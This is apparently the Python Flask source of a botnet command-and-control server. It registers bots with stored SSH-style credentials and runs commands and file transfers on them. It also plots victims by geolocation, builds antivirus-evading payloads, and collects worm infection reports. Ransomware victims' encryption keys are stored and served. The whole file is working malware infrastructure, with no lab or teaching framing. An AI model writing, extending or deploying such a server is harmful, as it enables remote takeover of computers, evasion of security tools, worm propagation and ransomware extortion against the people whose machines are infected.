from flask import Flask, request, jsonify, send_file, send_from_directory
from flask_cors import CORS
from bot import Bot
import os
import sys
import json
import requests
import time
from datetime import datetime

app = Flask(__name__)
CORS(app)  # Enable CORS for web GUI

# Simulate bot connections
bots = {}

# Geolocation cache to avoid excessive API calls
geo_cache = {}
GEO_CACHE_EXPIRY = 86400  # 24 hours in seconds

@app.route('/add_bot', methods=['POST'])
def add_bot():
    data = request.get_json()
    bot_id = data['bot_id']
    host = data['host']
    port = data['port']
    username = data['username']
    password = data['password']
    hostname = data.get('hostname', bot_id)
    os_type = data.get('os', 'Unknown')
    
    bots[bot_id] = {
        'host': host,
        'port': port,
        'username': username,
        'password': password,
        'hostname': hostname,
        'os': os_type,
        'last_seen': datetime.now().isoformat(),
        'status': 'online'
    }
    return jsonify({'status': 'success'}), 200

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """Update bot's last_seen timestamp"""
    data = request.get_json()
    bot_id = data.get('bot_id')
    
    if bot_id and bot_id in bots:
        bots[bot_id]['last_seen'] = datetime.now().isoformat()
        bots[bot_id]['status'] = 'online'
        return jsonify({'status': 'success'}), 200
    return jsonify({'status': 'error', 'message': 'Bot not found'}), 404

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.get_json()
    bot_id = data['bot_id']
    command = data['command']
    if bot_id in bots:
        try:
            bot = Bot(bots[bot_id]['host'], bots[bot_id]['port'], bots[bot_id]['username'], bots[bot_id]['password'])
            bot.connect()
            stdout, stderr = bot.execute_command(command)
            return jsonify({'stdout': stdout, 'stderr': stderr}), 200
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    else:
        return jsonify({'status': 'error', 'message': 'Bot not found'}), 404

@app.route('/download_file', methods=['POST'])
def download_file():
    data = request.get_json()
    bot_id = data['bot_id']
    remote_path = data['remote_path']
    local_path = data['local_path']
    if bot_id in bots:
        try:
            bot = Bot(bots[bot_id]['host'], bots[bot_id]['port'], bots[bot_id]['username'], bots[bot_id]['password'])
            bot.connect()
            bot.download_file(remote_path, local_path)
            return jsonify({'status': 'success'}), 200
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    else:
        return jsonify({'status': 'error', 'message': 'Bot not found'}), 404

@app.route('/upload_file', methods=['POST'])
def upload_file():
    data = request.get_json()
    bot_id = data['bot_id']
    local_path = data['local_path']
    remote_path = data['remote_path']
    if bot_id in bots:
        try:
            bot = Bot(bots[bot_id]['host'], bots[bot_id]['port'], bots[bot_id]['username'], bots[bot_id]['password'])
            bot.connect()
            bot.upload_file(local_path, remote_path)
            return jsonify({'status': 'success'}), 200
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    else:
        return jsonify({'status': 'error', 'message': 'Bot not found'}), 404

@app.route('/bots', methods=['GET'])
def get_bots():
    """Get list of all connected bots"""
    bot_list = []
    for bot_id, bot_info in bots.items():
        bot_list.append({
            'bot_id': bot_id,
            'host': bot_info['host'],
            'port': bot_info['port'],
            'username': bot_info['username']
        })
    return jsonify({'bots': bot_list}), 200

def get_geolocation(ip_address):
    """
    Get geolocation data for an IP address with caching
    Uses free ip-api.com service (45 requests per minute limit)
    """
    # Check cache first
    if ip_address in geo_cache:
        cached_data, timestamp = geo_cache[ip_address]
        if time.time() - timestamp < GEO_CACHE_EXPIRY:
            return cached_data
    
    # Handle localhost/private IPs
    if ip_address in ['127.0.0.1', 'localhost'] or ip_address.startswith('192.168.') or ip_address.startswith('10.'):
        return {
            'ip': ip_address,
            'country': 'Local Network',
            'city': 'Localhost',
            'latitude': 0.0,
            'longitude': 0.0,
            'isp': 'Private Network',
            'timezone': 'Local'
        }
    
    try:
        # Query ip-api.com (free, no API key required)
        response = requests.get(
            f'http://ip-api.com/json/{ip_address}',
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('status') == 'success':
                geo_data = {
                    'ip': ip_address,
                    'country': data.get('country', 'Unknown'),
                    'countryCode': data.get('countryCode', 'XX'),
                    'city': data.get('city', 'Unknown'),
                    'latitude': data.get('lat', 0.0),
                    'longitude': data.get('lon', 0.0),
                    'isp': data.get('isp', 'Unknown ISP'),
                    'timezone': data.get('timezone', 'Unknown'),
                    'region': data.get('regionName', 'Unknown')
                }
                
                # Cache the result
                geo_cache[ip_address] = (geo_data, time.time())
                return geo_data
    except Exception as e:
        print(f"[!] Geolocation lookup failed for {ip_address}: {e}")
    
    # Return default data if lookup fails
    return {
        'ip': ip_address,
        'country': 'Unknown',
        'countryCode': 'XX',
        'city': 'Unknown',
        'latitude': 0.0,
        'longitude': 0.0,
        'isp': 'Unknown ISP',
        'timezone': 'Unknown',
        'region': 'Unknown'
    }

@app.route('/api/bot_locations', methods=['GET'])
def get_bot_locations():
    """
    Get geolocation data for all connected bots
    Returns array of bot location objects for map visualization
    """
    locations = []
    
    for bot_id, bot_info in bots.items():
        ip = bot_info.get('host', '127.0.0.1')
        
        # Get geolocation data (with caching)
        geo_data = get_geolocation(ip)
        
        # Add bot-specific data
        location = {
            'bot_id': bot_id,
            'ip': ip,
            'lat': geo_data['latitude'],
            'lon': geo_data['longitude'],
            'country': geo_data['country'],
            'countryCode': geo_data.get('countryCode', 'XX'),
            'city': geo_data['city'],
            'region': geo_data.get('region', 'Unknown'),
            'isp': geo_data['isp'],
            'timezone': geo_data['timezone'],
            'status': 'online',  # Could be enhanced with actual status tracking
            'os': bot_info.get('os', 'Unknown'),
            'username': bot_info.get('username', 'Unknown'),
            'last_seen': bot_info.get('last_seen', datetime.now().isoformat())
        }
        
        locations.append(location)
    
    return jsonify({
        'success': True,
        'count': len(locations),
        'locations': locations
    }), 200

@app.route('/')
def index():
    """Serve the web GUI"""
    gui_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'web_gui_new.html')
    if os.path.exists(gui_path):
        return send_file(gui_path)
    else:
        return jsonify({'error': 'Web GUI not found'}), 404

@app.route('/styles.css')
def serve_css():
    """Serve the CSS file"""
    css_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'styles.css')
    if os.path.exists(css_path):
        return send_file(css_path, mimetype='text/css')
    else:
        return jsonify({'error': 'CSS not found'}), 404

@app.route('/styles_new.css')
def serve_new_css():
    """Serve the new CSS file"""
    css_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'styles_new.css')
    if os.path.exists(css_path):
        return send_file(css_path, mimetype='text/css')
    else:
        return jsonify({'error': 'New CSS not found'}), 404

@app.route('/app.js')
def serve_js():
    """Serve the JavaScript file"""
    js_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'app.js')
    if os.path.exists(js_path):
        return send_file(js_path, mimetype='application/javascript')
    else:
        return jsonify({'error': 'JavaScript not found'}), 404

@app.route('/build_evaded_payloads', methods=['POST'])
def build_evaded_payloads():
    """Build all evaded payloads"""
    import subprocess
    
    data = request.json
    technique = data.get('technique', 'full')
    output_dir = data.get('output_dir', 'evaded_payloads')
    
    try:
        # Get the project root directory
        project_root = os.path.dirname(os.path.dirname(__file__))
        builder_script = os.path.join(project_root, 'build_evaded_payload.py')
        
        # Run the builder script
        result = subprocess.run(
            [sys.executable, builder_script, '--technique', technique, '--output', output_dir],
            capture_output=True,
            text=True,
            cwd=project_root,
            timeout=300  # 5 minute timeout
        )
        
        # Parse output to count successes regardless of return code
        output_lines = result.stdout.split('\n')
        success_count = 0
        fail_count = 0
        
        for line in output_lines:
            if '[PASS]' in line or 'SUCCESS' in line:
                success_count += 1
            elif '[FAIL]' in line or 'FAILED' in line:
                fail_count += 1
        
        # Consider it successful if we have any successful builds
        if success_count > 0:
            return jsonify({
                'success': True,
                'success_count': success_count,
                'fail_count': fail_count,
                'output_dir': output_dir,
                'output': result.stdout
            })
        else:
            return jsonify({
                'success': False,
                'error': f'Build failed: No successful builds. {result.stderr}',
                'output': result.stdout
            }), 500
    except subprocess.TimeoutExpired:
        return jsonify({
            'success': False,
            'error': 'Build timeout (exceeded 5 minutes)'
        }), 500
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/build_single_payload', methods=['POST'])
def build_single_payload():
    """Build a single evaded payload"""
    import subprocess
    
    data = request.json
    payload = data.get('payload')
    technique = data.get('technique', 'full')
    
    if not payload:
        return jsonify({'success': False, 'error': 'No payload specified'}), 400
    
    try:
        # Get the project root directory
        project_root = os.path.dirname(os.path.dirname(__file__))
        input_path = os.path.join(project_root, 'payloads', payload)
        
        # Determine output filename
        if payload.endswith('.py'):
            output_filename = f"evaded_{payload}"
        else:
            output_filename = f"evaded_{payload}"
        
        output_path = os.path.join(project_root, 'evaded_payloads', output_filename)
        
        # Create evaded_payloads directory if it doesn't exist
        os.makedirs(os.path.join(project_root, 'evaded_payloads'), exist_ok=True)
        
        # Call av_evasion.py directly with quiet mode to avoid encoding issues
        av_evasion_script = os.path.join(project_root, 'payloads', 'av_evasion.py')
        result = subprocess.run(
            [sys.executable, av_evasion_script, '-i', input_path, '-o', output_path, '--technique', technique, '-q'],
            capture_output=True,
            text=True,
            cwd=project_root,
            timeout=60  # 1 minute timeout
        )
        
        # Check if file was created successfully (av_evasion may return non-zero but still create file)
        if os.path.exists(output_path):
            return jsonify({
                'success': True,
                'output_file': output_path,
                'message': f'Evaded payload created successfully'
            })
        else:
            return jsonify({
                'success': False,
                'error': f'Build failed (return code: {result.returncode})',
                'details': {
                    'stdout': result.stdout[:500] if result.stdout else '',
                    'stderr': result.stderr[:500] if result.stderr else ''
                }
            }), 500
    except subprocess.TimeoutExpired:
        return jsonify({
            'success': False,
            'error': 'Build timeout (exceeded 1 minute)'
        }), 500
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/worm_report', methods=['POST'])
def worm_report():
    """Receive worm propagation reports"""
    data = request.json
    
    print("\n" + "="*60)
    print("🕸️  WORM ACTIVITY REPORT")
    print("="*60)
    print(f"Worm ID: {data.get('worm_id')}")
    print(f"Source Host: {data.get('hostname')} ({data.get('local_ip')})")
    print(f"Infected Hosts: {len(data.get('infected_hosts', []))}")
    print(f"Vulnerable Hosts: {data.get('vulnerable_hosts')}")
    print(f"Timestamp: {data.get('timestamp')}")
    
    if data.get('infected_hosts'):
        print("\nNew Bots Recruited:")
        for host in data.get('infected_hosts', []):
            print(f"  • {host}")
    
    print("="*60 + "\n")
    
    return jsonify({'success': True, 'message': 'Report received'})

@app.route('/ransomware_data', methods=['POST'])
def ransomware_data():
    """Receive ransomware encryption data"""
    data = request.json
    
    print("\n" + "="*60)
    print("🔒 RANSOMWARE ENCRYPTION REPORT")
    print("="*60)
    print(f"Victim ID: {data.get('victim_id')}")
    print(f"Host: {data.get('hostname')} ({data.get('username')})")
    print(f"Files Encrypted: {data.get('encrypted_files')}")
    print(f"Encryption Key: {data.get('encryption_key')[:50]}...")
    print(f"Timestamp: {data.get('timestamp')}")
    print("="*60 + "\n")
    
    # Store encryption key for potential recovery
    victim_id = data.get('victim_id')
    if victim_id:
        key_file = os.path.join(os.path.dirname(__file__), '..', 'ransom_keys', f'{victim_id}.key')
        os.makedirs(os.path.dirname(key_file), exist_ok=True)
        with open(key_file, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"[+] Encryption key stored: {key_file}\n")
    
    return jsonify({'success': True, 'message': 'Data received'})

@app.route('/get_ransom_keys', methods=['GET'])
def get_ransom_keys():
    """Get all stored ransomware encryption keys"""
    keys_dir = os.path.join(os.path.dirname(__file__), '..', 'ransom_keys')
    
    if not os.path.exists(keys_dir):
        return jsonify({'keys': [], 'total': 0})
    
    keys_list = []
    total_encrypted_files = 0
    
    for filename in os.listdir(keys_dir):
        if filename.endswith('.key'):
            key_path = os.path.join(keys_dir, filename)
            try:
                with open(key_path, 'r') as f:
                    key_data = json.load(f)
                    encrypted_count = len(key_data.get('encrypted_files', []))
                    total_encrypted_files += encrypted_count
                    
                    keys_list.append({
                        'victim_id': key_data.get('victim_id'),
                        'hostname': key_data.get('hostname'),
                        'username': key_data.get('username'),
                        'timestamp': key_data.get('timestamp'),
                        'encrypted_files_count': encrypted_count,
                        'encrypted_files': key_data.get('encrypted_files', []),
                        'encryption_key': key_data.get('encryption_key'),
                        'key_file': filename
                    })
            except Exception as e:
                print(f"[!] Error reading key file {filename}: {e}")
                continue
    
    # Sort by timestamp (newest first)
    keys_list.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
    
    return jsonify({
        'keys': keys_list,
        'total': len(keys_list),
        'total_encrypted_files': total_encrypted_files
    })

@app.route('/ransom_keys/<filename>', methods=['GET'])
def download_ransom_key(filename):
    """Download a specific ransomware key file"""
    keys_dir = os.path.join(os.path.dirname(__file__), '..', 'ransom_keys')
    return send_from_directory(keys_dir, filename, as_attachment=True)

if __name__ == '__main__':
    print("[*] Starting C&C Server...")
    print("[*] Web GUI available at: http://localhost:5000")
    print("[*] API Endpoints:")
    print("    - POST /add_bot")
    print("    - POST /send_command")
    print("    - POST /upload_file")
    print("    - POST /download_file")
    print("    - GET  /bots")
    print("    - GET  / (Web GUI)")
    app.run(host='0.0.0.0', port=5000, debug=True)